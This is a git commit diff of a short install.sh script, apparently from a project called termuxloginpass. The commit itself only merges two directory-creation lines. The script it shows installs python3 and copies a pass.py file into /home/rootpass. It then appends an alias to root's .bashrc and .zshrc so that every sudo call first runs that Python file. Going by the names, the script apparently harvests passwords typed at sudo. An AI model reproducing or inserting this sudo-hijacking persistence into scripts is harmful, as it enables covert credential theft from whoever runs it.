a9eb41167a49cda955eb842eff5c0f4a80e8cdc7
Dima-diep <52601543+Dima-diep@users.noreply.github.com>
2021-07-19 13:55:03 +0300

    install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 apt install python3 -y
-cd /home
-sudo mkdir rootpass
+sudo mkdir /home/rootpass
 sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.bashrc
 sudo echo "alias sudo=\'python3 /home/rootpass/pass.py && sudo\'" >> /root/.zshrc
 sudo mv ~/termuxloginpass/pass.py /home/rootpass
